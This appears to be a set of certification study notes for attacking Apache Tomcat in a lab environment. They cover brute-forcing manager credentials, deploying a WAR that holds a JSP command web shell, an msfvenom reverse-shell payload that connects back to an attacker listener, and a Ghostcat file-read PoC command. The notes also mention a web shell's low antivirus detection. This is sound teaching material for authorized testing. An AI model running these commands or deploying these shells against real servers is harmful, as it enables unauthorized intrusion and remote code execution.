# 1. 🎯 Objective

The previous module established that Tomcat is exposed externally. The goal here is to determine whether we can turn access to Tomcat into **remote code execution (RCE)** and ultimately gain internal access.

The key attack surface is:

```text
Tomcat
   │
   ├── /manager
   │
   └── /host-manager
          │
          ▼
   Authentication
          │
          ▼
   Valid credentials
          │
          ▼
   Management access
          │
          ▼
   WAR deployment
          │
          ▼
   JSP execution
          │
          ▼
         RCE
```

The source specifically emphasizes that access to `/manager` or `/host-manager` can potentially lead to RCE.

---

# 2. 🔐 Tomcat Manager Login Brute Force

The target is:

```text
http://web01.inlanefreight.local:8180
```

A useful Metasploit module is:

```text
auxiliary/scanner/http/tomcat_mgr_login
```

Other possible approaches include:

- Burp Suite Intruder
    
- Custom Python scripts
    
- Custom Bash/cURL scripts
    

The source uses **Metasploit**.

---

# 3. ⚙️ Configure Metasploit

First configure:

```text
VHOST
RPORT
STOP_ON_SUCCESS
RHOSTS
```

Commands from the module:

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

---

# 4. 🧠 Why `STOP_ON_SUCCESS` Matters

Set:

```text
STOP_ON_SUCCESS true
```

Why?

Once a valid credential is discovered, continuing to send authentication attempts is unnecessary.

```text
Credential list
      ↓
Try credentials
      ↓
Valid credential found
      ↓
STOP
```

This:

- Reduces unnecessary requests
    
- Reduces noise
    
- Saves time
    
- Avoids generating additional authentication attempts
    

The source specifically recommends this behavior.

---

# 5. 📋 `show options`

Always verify your configuration before running a scanner:

```text
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options
```

Important options include:

|Option|Purpose|
|---|---|
|`RHOSTS`|Target host|
|`RPORT`|Target TCP port|
|`VHOST`|HTTP virtual host|
|`TARGETURI`|Manager login path|
|`USER_FILE`|Username wordlist|
|`PASS_FILE`|Password wordlist|
|`USERPASS_FILE`|Username/password combinations|
|`STOP_ON_SUCCESS`|Stop after valid credentials|
|`THREADS`|Concurrent threads|
|`BRUTEFORCE_SPEED`|Brute-force speed|
|`BLANK_PASSWORDS`|Test blank passwords|
|`USER_AS_PASS`|Try usernames as passwords|
|`SSL`|Enable HTTPS/TLS|
|`PROXIES`|Route traffic through a proxy|

The default target URI shown by the module is:

```text
/manager/html
```

---

# 6. 🔑 Credential Discovery

Running the scanner produces multiple failed combinations.

Eventually:

```text
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
```

Therefore the discovered credential pair is:

```text
Username: tomcat
Password: admin
```

### 🚨 Important

This demonstrates why **weak/default credentials should be checked during Tomcat assessments**.

The previous module discussed credentials such as:

```text
tomcat:tomcat
admin:admin
```

while this attack discovers:

```text
tomcat:admin
```

---

# 7. 🧠 Professional Tool Usage

One of the most important lessons in this module isn't actually a command.

It is:

> **Know how your tools work.**

The source explicitly explains that penetration tests are often **time-boxed**, so tools such as Metasploit can improve efficiency. However, a pentester should still understand:

- What the scanner is doing
    
- What requests are being generated
    
- What the potential impact is
    
- How to perform the same task manually
    
- How to troubleshoot failures
    

### CPTS mindset

```text
Don't become:
"Metasploit says it works."

Become:
"I understand exactly what Metasploit is sending."
```

---

# 8. 🕵️ Using Burp Suite to Debug Metasploit

If a Metasploit module behaves unexpectedly, you can proxy the traffic through **Burp Suite** or ZAP.

Set:

```text
PROXIES HTTP:127.0.0.1:8080
```

Example:

```text
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080
```

---

# 9. 🔬 Understanding Basic Authentication

The scanner sends HTTP requests using **Basic Authentication**.

In Burp, you'll see an:

```text
Authorization:
```

header.

The credentials are Base64 encoded.

For example:

```text
admin:vagrant
```

becomes:

```text
YWRtaW46dmFncmFudA==
```

Decode it:

```bash
echo YWRtaW46dmFncmFudA== | base64 -d
```

Output:

```text
admin:vagrant
```

---

# 🧠 Important: Base64 ≠ Encryption

This is a classic pentesting concept.

```text
admin:vagrant
      ↓
Base64
      ↓
YWRtaW46dmFncmFudA==
```

Base64 is simply an **encoding mechanism**.

It does NOT provide confidentiality.

Anyone who obtains the encoded value can decode it.

---

# 10. 🐍 Custom Python Brute-Force Script

The module also demonstrates writing a simple Python script.

The script accepts:

```text
-U / --url
-P / --path
-u / --usernames
-p / --passwords
```

The basic logic is:

```text
Read usernames
      ↓
Read passwords
      ↓
For every username
      ↓
Try every password
      ↓
Send HTTP request
      ↓
Check HTTP status
      ↓
200 = Success
```

The source's implementation uses:

```python
r = requests.get(new_url, auth=(u, p))
```

and checks:

```python
if r.status_code == 200:
```

---

# 11. 🧰 Python Script Usage

Display help:

```bash
python3 mgr_brute.py -h
```

It expects:

```text
-U URL
-P PATH
-u USERNAMES
-p PASSWORDS
```

Example usage:

```bash
python3 mgr_brute.py \
-U http://web01.inlanefreight.local:8180/ \
-P /manager \
-u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
-p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

Result:

```text
[+] Atacking.....

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```

---

# 12. ⚔️ TOMCAT MANAGER → WAR FILE UPLOAD

This is the **most important exploitation section**.

The Tomcat Manager interface is normally available at:

```text
/manager/html
```

Users assigned:

```text
manager-gui
```

can access the GUI.

Valid manager credentials can potentially be used to upload a:

```text
.WAR
```

file.

---

# 13. 📦 What Is a WAR File?

WAR means:

> **Web Application Archive**

A WAR packages a Java web application for deployment by Tomcat.

Think of it like:

```text
WAR
 │
 ├── JSP files
 ├── Java classes
 ├── Configuration
 └── Other web resources
```

Tomcat can automatically deploy the application.

Therefore:

```text
Valid Manager Access
        ↓
WAR Upload
        ↓
Tomcat Deployment
        ↓
JSP
        ↓
Command Execution
```

---

# 14. 🐚 JSP Web Shell

The source demonstrates using a JSP command-execution web shell.

The important part of the shell is:

```java
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
}
```

### What does it do?

```text
HTTP request
      ↓
?cmd=id
      ↓
request.getParameter("cmd")
      ↓
Runtime.getRuntime().exec()
      ↓
Operating system command
```

---

# 15. 📦 Creating the WAR

The source downloads the JSP:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```

Then creates:

```bash
zip -r backup.war cmd.jsp
```

Output:

```text
adding: cmd.jsp (deflated 81%)
```

---

# 16. 🌐 Deploying the WAR

Go to:

```text
http://web01.inlanefreight.local:8180/manager/html
```

Then:

```text
Browse
   ↓
Select backup.war
   ↓
Deploy
```

Tomcat creates an application:

```text
/backup
```

---

# 17. ❌ Why `/backup/` Returns 404

After deployment:

```text
/backup/
```

may return:

```text
404 Not Found
```

That's because the JSP file itself needs to be specified.

The shell is located at:

```text
/backup/cmd.jsp
```

---

# 18. 💻 Execute Commands Through JSP

Example:

```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

Result:

```text
Command: id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

### Result

RCE achieved as:

```text
tomcat
UID 1001
GID 1001
```

---

# 🧠 19. Complete WAR Attack Chain

![Image](https://images.openai.com/static-rsc-4/yvTAqt_LhSuWWsDl-1G_R9xXxyS2oCov4gt96wxQfK3Ca6ZaG9JRAbsJC1ZPqSK1ut4fzOadxLgz_ziasLTdFNxJ30N7hnkjjysMfX0pDE3ttmOEqR6ZMFz26Lj-AgYi8ct-fGPp1EsJUCZ045S_1PYVUVTnSVRBBoHGPrjqAn_K68-CDi7_KIINCd9ToX_E?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/fMds9GdKYUCuJldutB3Iu1JuyiptaB5D43ZdqY2Wx6kKa8dBNRpVPcCSVJ6w3479txxKT6xFxd7-gRux9uut8rtCPXxGT4hYvuoTQIaVnZIqpRiWGGXbOPs_h0vIzhMLxNSubqcM3PUf8bhKIbtf1LfyrrLRYD2w3Yh5OnMwoTiTWwKrBd074Q2ai84BK8TS?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/VIIxOLGoYSLR4A56dMZYUXpG65Z9dGHZswxYAKGcMmSgJacZjb96pob8hn5Frq5lhLk5pSa9q3C2LFWbkTCzZK082qfA2-Shmd7YgD0mpd-lIKwVxqWaIDMHUSaYnG-BBmUUkEfay7Bc2MUUx0ieLgd0TzmrmgR9dJH7is_KIhVJyTMNG5fmd0HkjLgPZUay?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-Odw818kkMaeHonSdLc_-SFxgrYEoWbFL80JSDCstA0FIPti2C2HycsgqLkpvqjPNKnI0zs8htTCtzmtToY-gB-dxsOQIb15HLrU122M6exnuxQ74IEF9H-OEmnendYGbG_EqkcgLELfKKjwQP7GHt_N_Gnlp-rLlPUDhx5OiMaqbu6jf42-IgtooaxK-MLJ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/MbiaGkJAVDZrha7aivIg8Gf4COmf7viap7nVFA26t6ZWOSgIfSE-3XW3JY7ADzlItwShayBL-g89h32kjfg75KzwF5ybX5-VOKlByaPWIdRPbtf6hiTRZQHoonzCHLInT7GUYXGbhhbSzwFIhj91T446PQ_Y1zsAYNguf9wZAB4Uy5wVuyMXHibClltqcpD3?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/OS6Boavaj6AxBs-sYohU02eWYshpvHwZcMmwlX0d0NVEmKL2-F6f3YYNVpknzzLzM1KeoBVnLJQ9D9frNi13dnlwZyCq9FU79f2pg3Eegl1ma4E7P2O7svxmPH-lVcF2knUqaggCiRToeBREVFVjSbtPYEhl8ZKT02VfTzuK0btMkdVyMOT4Qbj5qR38WQY3?purpose=fullsize)

```text
             Tomcat
                │
                ▼
         /manager/html
                │
                ▼
       Weak credentials
                │
                ▼
        Manager access
                │
                ▼
          Create WAR
                │
                ▼
          Upload WAR
                │
                ▼
       Tomcat deploys app
                │
                ▼
            /backup
                │
                ▼
           cmd.jsp
                │
                ▼
       ?cmd=<command>
                │
                ▼
               RCE
                │
                ▼
             tomcat
```

🔥 **Memorize this chain.**

---

# 20. 🧹 Cleanup After WAR Deployment

After testing, the source recommends cleaning up.

Go back to:

```text
Tomcat Manager
```

and click:

```text
Undeploy
```

for the application.

The source notes that the uploaded WAR and associated application directory will typically be removed.

The example upload location is:

```text
/opt/tomcat/apache-tomcat-10.0.10/webapps
```

The deployed application creates:

```text
backup.war
backup/
    cmd.jsp
    META-INF/
```

---

# 21. 🐚 Generating a Malicious WAR With msfvenom

Another method is to generate a WAR containing a JSP reverse shell.

The source uses:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

Output:

```text
Payload size: 1098 bytes
Final size of war file: 1098 bytes
```

---

# 22. 🔄 Reverse Shell

Start a listener:

```bash
nc -lnvp 4443
```

Output:

```text
listening on [any] 4443 ...
```

After the application executes:

```text
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224
```

Then:

```bash
id
```

Result:

```text
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

---

# 🧠 23. Web Shell vs Reverse Shell

### Web shell

```text
Attacker
   │
   │ HTTP request
   ▼
Tomcat
   │
   ▼
JSP
   │
   ▼
Command
```

You manually send commands through HTTP.

### Reverse shell

```text
Tomcat
   │
   │ outbound connection
   ▼
Attacker listener
```

The target connects back to the attacker.

---

# 24. 🤖 Metasploit Automation

The module mentions:

```text
multi/http/tomcat_mgr_upload
```

Metasploit can automate the process of:

```text
Manager authentication
        ↓
WAR creation/upload
        ↓
Deployment
        ↓
Payload execution
```

---

# 25. 🕵️ Lightweight JSP Web Shell

The source also mentions a lightweight JSP shell that is:

```text
under 1 KB
```

It uses a **bookmarklet/browser bookmark** for its user interface.

An interesting point is that minimizing the web-shell footprint can potentially reduce detection by standard signatures.

The source reports that the shell was detected by:

```text
2 / 58
```

anti-virus vendors at the time of writing.

---

# ⚠️ 26. Important Web Shell Warning

Do **not** take low AV detection as proof that a shell is safe or invisible.

Detection can come from:

- Network monitoring
    
- Web access logs
    
- EDR
    
- File integrity monitoring
    
- Behavioral detection
    
- WAF
    
- Process monitoring
    
- Human investigation
    

The source's practical lesson is about **reducing assessment footprint**, not guaranteeing stealth.

---

# 🧹 27. Web Shell Operational Hygiene

When uploading a web shell during an authorized assessment, protect it from unauthorized access.

The source recommends:

### 1. Randomized filename

For example:

```text
MD5-like/random filename
```

instead of:

```text
shell.jsp
cmd.jsp
webshell.jsp
```

### 2. Restrict source IP

Only allow your assessment IP to access it.

### 3. Password protect it

Add authentication where appropriate.

### 4. Clean it up

Remove the shell after testing.

### 5. Document it

Record:

- Filename
    
- Location
    
- Hash
    
- Upload location
    
- What was changed
    

The goal is to avoid another attacker finding your assessment shell and using it as their own foothold.

---

# 👻 28. CVE-2020-1938 — Ghostcat

![Image](https://images.openai.com/static-rsc-4/JuUecs_VHfTSstoQ-bXHg2SOnfwNatrEq1eqQfGN9VKdpqE23xAki8ljHNggu2f41lJIrWdSm6wp2lG9riys-ZUuQmZllhjw_1FEMvnFrXCYocfh2RPJ1R9Zln3DqhEEYc79u3RZFpf9I_OYcBLm8OEAcAeunLfVfSzxVaDbNVVIHQrLnMYl8FOu2p5nr1F1?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/mNKZQbg2xSzDnaClDQktUN-5TibmUgtn1gj8eB1dy3JGGcmrKPNQhGNbt2EGgcJe_f_Aos9AZi9PN40RSjnIfPBRooNM5_GaZqFvgN6niXVF6k37kMHy6-6gvk5Jg93LrHRwOzTARw7mjPXdmQqvgbyWbIYQE85JOFUAOhelFanMxuhrH4IYfNam5TSLr635?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/RJw8V70V8hwrPh1KsGE52RLkJEIu4vnAiwAQIhh2nxxO2SaMxZabEUfSwB_3XAKLqGg9wHlolhLHc0AzK0cHqCz1VsjikExIuq-u7RSVVtFeO1B0kvXr16opFCmWgN4a2Msi-ufL39azNPaDTYbLidqtKxT_eY4AG2YeLF3UJ3skhtPjiK_dg8LbwAof_qsY?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/g5wpzbmZOmwOoF_HY_70seYme-pic5TWa95zzgLI35ipHD4RW-YnJBcqxPR5FthRZQoSzCiwtXs1rbwm2F554Jehh27ma1vUHVJGd4aVDDWA6rF5hPnLP2DpOcXRgphgNJVHekR1IsK_YC_nw9tZVTLNTl1Dq4JMtkXbW3RDOcXor7AlvhuKh3s_mKGvavb9?purpose=fullsize)

One of the most important Tomcat vulnerabilities in this module is:

```text
CVE-2020-1938
```

Known as:

> **Ghostcat**

The vulnerability allows **unauthenticated Local File Inclusion (LFI)** under certain vulnerable configurations.

---

# 29. 🧠 What Is AJP?

AJP stands for:

> **Apache JServ Protocol**

It is a binary protocol used to proxy requests.

Typical architecture:

```text
Internet
   │
   ▼
Apache / Front-End Web Server
   │
   │ AJP
   ▼
Tomcat
```

AJP is commonly used when an application server sits behind a front-end web server.

---

# 30. 🔌 AJP Port

The AJP service typically runs on:

```text
TCP 8009
```

Therefore, when Tomcat is discovered, checking **8009** can be valuable.

The module pairs it with:

```text
8080
```

---

# 31. 🔎 Nmap Scan for AJP

The source uses:

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

Result:

```text
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

### Important observation

```text
8080
 ↓
Tomcat HTTP

8009
 ↓
AJP
```

---

# 32. 💥 Ghostcat Affected Versions

The source states that versions before:

```text
9.0.31
8.5.51
7.0.100
```

were vulnerable.

### Memorize

```text
9.0.30 → vulnerable
9.0.31 → fixed
```

```text
8.5.50 → vulnerable
8.5.51 → fixed
```

```text
7.0.99 → vulnerable
7.0.100 → fixed
```

---

# 33. 📂 Ghostcat File Access

The module explains an important limitation:

> The exploit can only read files and folders **within the webapps folder**.

Therefore:

```text
/etc/passwd
```

cannot be directly accessed through this vulnerability in the demonstrated scenario.

This distinction is extremely important.

### Don't assume:

```text
LFI = read everything
```

Instead:

```text
Vulnerability
     ↓
Understand file-access boundary
     ↓
Determine what is actually readable
```

---

# 34. 📄 Reading `WEB-INF/web.xml`

The module demonstrates reading:

```text
WEB-INF/web.xml
```

using the PoC:

```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

The output reveals the application's deployment descriptor.

For example:

```xml
<web-app ... version="4.0" metadata-complete="true">

    <display-name>Welcome to Tomcat</display-name>

    <description>
       Welcome to Tomcat
    </description>

</web-app>
```

---

# 🧠 35. Why `WEB-INF` Matters Again

Notice how `WEB-INF/web.xml` appears in **both Tomcat enumeration and Ghostcat exploitation**.

That's not accidental.

```text
Tomcat Enumeration
       ↓
WEB-INF/web.xml
       ↓
Application information
```

and:

```text
Ghostcat
       ↓
AJP LFI
       ↓
WEB-INF/web.xml
       ↓
Application information
```

The source notes that on some Tomcat installations, sensitive information may be accessible within `WEB-INF`.

---

# 🧭 36. COMPLETE ATTACK METHODOLOGY

![Image](https://images.openai.com/static-rsc-4/mHSw2OceEG6_iSliovdvmoz3RJNFmn7WFP7E0pqNhT3kiLDgbqcvMqud15Y2Vek4J4CwjRVBpuI13WNnosaCwL7OTxdaRuYqJRqiUzy6fdMsMxD2p5lSn_FBGN_i-29Vxed4jU96fhx1hGVW3WHooI-jDlRvov92FFf2W6wAfbqybHh1z_fN76rRj6CyaYt9?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/MWZfFyaT460OxR77R5NR92i_Fp06WA69Ch6_a1vA-OqwWZHpduB1rgCc7Cp4FHZ52J9do0-JiRtjz4Xjs1iBscZISJYF_PID_8P_rxf9PWwXUppoIK0_CCiv6Lj90UQ3J1LS1M0-j66ZEyDepBAx52pR481u62-iSyN4Y8g2etSSTqed7h_tB6RB0aWAsN1e?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/VMBzBFUp0sndfaGiV5FWJlKqMlOCPNki36D9xC1tsFtYeSkFBQlW_ZRvA9mlvdEes2-TssQ8d7CEqXTlrDsLFK0TlaMVdPeGyAEQuEQ0KEbYrtEWbzOjUCYu17aPkZJ2JVWfrjhzQ0wJpFKRXOflOEuK7qcZBPmwRw_4330Uzhvi6EcwFHLFQIQgcApjkPWj?purpose=fullsize)

```text
                         TOMCAT
                            │
                            ▼
                    Identify Version
                            │
             ┌──────────────┴──────────────┐
             │                             │
             ▼                             ▼
        /manager                        AJP 8009
             │                             │
             ▼                             ▼
      Authentication                    Ghostcat
             │                             │
             ▼                             ▼
       Weak Credentials                LFI
             │                             │
             ▼                             ▼
       Manager Access              WEB-INF files
             │
             ▼
        WAR Upload
             │
             ▼
       JSP Application
             │
             ▼
          Web Shell
             │
             ▼
             RCE
             │
             ▼
        tomcat user
             │
             ▼
     Privilege Escalation
             │
             ▼
     Internal Enumeration
```

---

# 🔥 37. Attack Paths to Memorize

## PATH 1 — Manager Credentials

```text
Tomcat
 ↓
/manager
 ↓
Weak credentials
 ↓
Manager access
```

---

## PATH 2 — WAR Deployment

```text
Manager access
 ↓
WAR upload
 ↓
Tomcat deploys WAR
 ↓
JSP
 ↓
Command execution
 ↓
RCE
```

---

## PATH 3 — Reverse Shell

```text
Manager
 ↓
Malicious WAR
 ↓
JSP reverse shell
 ↓
Netcat listener
 ↓
Tomcat shell
```

---

## PATH 4 — Ghostcat

```text
Tomcat
 ↓
AJP :8009
 ↓
CVE-2020-1938
 ↓
Unauthenticated LFI
 ↓
Files inside webapps
 ↓
Sensitive information
```

---

# 📋 38. Tomcat Pentesting Checklist

## 🔍 Discovery

-  Identify Tomcat
    
-  Identify version
    
-  Check error pages
    
-  Check `/docs`
    
-  Check `/manager`
    
-  Check `/host-manager`
    

## 🔐 Authentication

-  Determine authentication mechanism
    
-  Test authorized default/weak credentials
    
-  Enumerate Tomcat roles
    
-  Check Manager access
    

## 📦 Manager

-  `/manager/html`
    
-  Determine if `manager-gui` is available
    
-  Assess WAR deployment functionality
    

## ⚔️ Exploitation

-  WAR deployment
    
-  JSP execution
    
-  Web shell
    
-  Reverse shell
    

## 🔌 AJP

-  Scan TCP/8009
    
-  Identify AJP
    
-  Check Tomcat version
    
-  Assess CVE-2020-1938
    

## 🧹 Cleanup

-  Undeploy WAR
    
-  Remove uploaded files
    
-  Remove shell
    
-  Record filename/hash/location
    
-  Document modifications
    

---

# ⭐ 39. CPTS HIGH-VALUE FACTS

### Tomcat Manager

```text
/manager/html
```

### Important role

```text
manager-gui
```

### Important credential found

```text
tomcat:admin
```

### WAR

```text
Web Application Archive
```

### WAR → RCE

```text
Manager access
 ↓
WAR upload
 ↓
JSP
 ↓
RCE
```

### Typical compromised account in example

```text
tomcat
UID 1001
```

### AJP

```text
Apache JServ Protocol
```

### AJP port

```text
8009
```

### HTTP Tomcat port in examples

```text
8080 / 8180
```

### Ghostcat

```text
CVE-2020-1938
```

### Ghostcat impact

```text
Unauthenticated LFI
```

### Ghostcat versions from the module

```text
< 9.0.31
< 8.5.51
< 7.0.100
```

---

# 🧠 40. Things You Should Understand, Not Just Memorize

### ① Why Manager access is dangerous

Because it can provide application deployment capabilities.

```text
Authentication
      ↓
Management
      ↓
Deployment
      ↓
Code execution
```

---

### ② Why `WEB-INF` matters

Because it can contain application internals:

```text
WEB-INF/
├── web.xml
├── classes/
└── lib/
```

---

### ③ Why AJP matters

AJP isn't simply "another web port."

It is an **application-server proxy protocol** and historically exposed additional attack surface.

```text
Front-end server
       │
       │ AJP
       ▼
     Tomcat
```

---

### ④ Why understanding HTTP matters

The Metasploit scanner isn't magic.

It is ultimately making HTTP authentication requests.

Burp lets you observe those requests and understand:

```text
Request
 ↓
Authorization header
 ↓
Base64 credentials
 ↓
Tomcat
 ↓
HTTP response
```

---

# ⚡ 41. FINAL TOMCAT CHEAT SHEET

```text
╔══════════════════════════════════════════════════════╗
║              ATTACKING TOMCAT — CPTS                 ║
╠══════════════════════════════════════════════════════╣
║ DISCOVERY                                            ║
║ Error pages → version                                ║
║ /docs → version/documentation                        ║
║ /manager → management interface                     ║
║ /host-manager → host management                     ║
╠══════════════════════════════════════════════════════╣
║ AUTHENTICATION                                       ║
║ Metasploit: tomcat_mgr_login                        ║
║ Burp Intruder / custom scripts                      ║
║ Example hit: tomcat:admin                            ║
╠══════════════════════════════════════════════════════╣
║ MANAGER                                              ║
║ /manager/html                                        ║
║ manager-gui role                                     ║
║                                                      ║
║ Manager access → WAR upload → JSP → RCE             ║
╠══════════════════════════════════════════════════════╣
║ WAR                                                  ║
║ Web Application Archive                              ║
║ Tomcat automatically deploys WAR applications       ║
║                                                      ║
║ backup.war → /backup → cmd.jsp → command execution  ║
╠══════════════════════════════════════════════════════╣
║ REVERSE SHELL                                        ║
║ java/jsp_shell_reverse_tcp                          ║
║ Netcat listener                                      ║
║ Example user: tomcat (UID 1001)                    ║
╠══════════════════════════════════════════════════════╣
║ AJP                                                  ║
║ Apache JServ Protocol                                ║
║ Default/common port: 8009                           ║
╠══════════════════════════════════════════════════════╣
║ GHOSTCAT                                             ║
║ CVE-2020-1938                                        ║
║ Unauthenticated LFI                                 ║
║ Vulnerable before:                                  ║
║ 9.0.31 / 8.5.51 / 7.0.100                          ║
║                                                      ║
║ Access limited to webapps in demonstrated PoC       ║
╠══════════════════════════════════════════════════════╣
║ IMPORTANT FILE                                       ║
║ WEB-INF/web.xml                                      ║
║                                                      ║
║ Can reveal application/deployment information        ║
╠══════════════════════════════════════════════════════╣
║ CLEANUP                                              ║
║ Undeploy WAR                                         ║
║ Remove web shell                                    ║
║ Record location/hash                                ║
║ Document modifications                               ║
╚══════════════════════════════════════════════════════╝
```

---

# 🏆 42. The Big Picture

If you remember **only one workflow**, make it this:

```text
             ┌──────────────┐
             │    TOMCAT    │
             └──────┬───────┘
                    │
          Fingerprint / Enumerate
                    │
          ┌─────────┴─────────┐
          │                   │
          ▼                   ▼
      /manager             :8009
          │                   │
          ▼                   ▼
   Weak credentials       Ghostcat
          │                   │
          ▼                   ▼
   Manager access            LFI
          │                   │
          ▼                   ▼
      WAR upload        WEB-INF files
          │
          ▼
       JSP shell
          │
          ▼
         RCE
          │
          ▼
     tomcat/www-data
          │
          ▼
 Privilege Escalation
          │
          ▼
 Internal Enumeration
```

The module's final takeaway is particularly important: **Tomcat is worth investigating on both internal and external assessments because weak/default Manager credentials can rapidly become RCE, and Tomcat may sometimes run with highly privileged accounts such as `SYSTEM` or `root`.**

### 🔥 CPTS priority

**Know these absolutely cold:**

`/manager/html` → `manager-gui` → weak credentials → **WAR upload** → **JSP** → **RCE**

and separately:

`AJP :8009` → **CVE-2020-1938 Ghostcat** → **LFI** → `WEB-INF` information.